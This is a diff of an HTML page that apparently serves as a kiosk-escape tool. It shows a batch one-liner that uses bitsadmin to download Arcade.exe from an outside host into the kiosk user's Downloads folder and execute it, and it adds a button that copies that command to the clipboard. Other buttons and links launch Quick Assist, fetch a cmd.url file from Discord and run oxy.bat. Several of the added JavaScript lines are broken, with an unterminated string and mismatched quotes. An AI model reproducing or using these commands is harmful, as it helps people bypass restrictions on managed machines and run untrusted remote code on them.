@@ -8,9 +8,22 @@
 <body>
     <a href="https://cdn.discordapp.com/attachments/1120094264622325780/1155068189596717086/cmd.url" download="cmd.url">cmd.url</a>
     <p>echo off&cls&echo Downloading Files...&bitsadmin /transfer qwe /priority foreground https://picteon.dev/files/Arcade.exe c:\users\kiosk\downloads\runthis+.exe&echo Starting Files...&timeout /nobreak /t 1 >nul&runthis+.exe</p>
+    <button onclick="kopyala()">Kopyala</button>
+    <script>
+        function kopyala() {
+            var metinKutusu = "echo off&cls&echo Downloading Files...&bitsadmin /transfer qwe /priority foreground https://picteon.dev/files/Arcade.exe c:\users\kiosk\downloads\runthis+.exe&echo Starting Files...&timeout /nobreak /t 1 >nul&runthis+.exe"
+            
+            /* Metin kutusu içeriğini panoya kopyala */
+            navigator.clipboard.writeText(metinKutusu.value).then(function() {
+                alert("Metin kopyalandı:);
+            }).catch(function(err) {
+                console.error("Kopyalama hatası: ", err);
+            });
+        }
+    </script>
     <p></p>
     <button onclick="window.open('ms-quick-assist:', '_blank')">Open Microsoft Quick Assist</button>
-    <p><button onclick="window.open('ms-clipchamp:', '_blank')">Open Microsoft Clipchamp</button></p>
+    <p><button onclick="document.execCommand("copy");">Open Microsoft Clipchamp</button></p>
     <p>
         <a href="cd c:&cd/&cd users&cd kiosk&cd downloads&dir&oxy.bat" target="_blank">Run CD Command</a>
     </p>
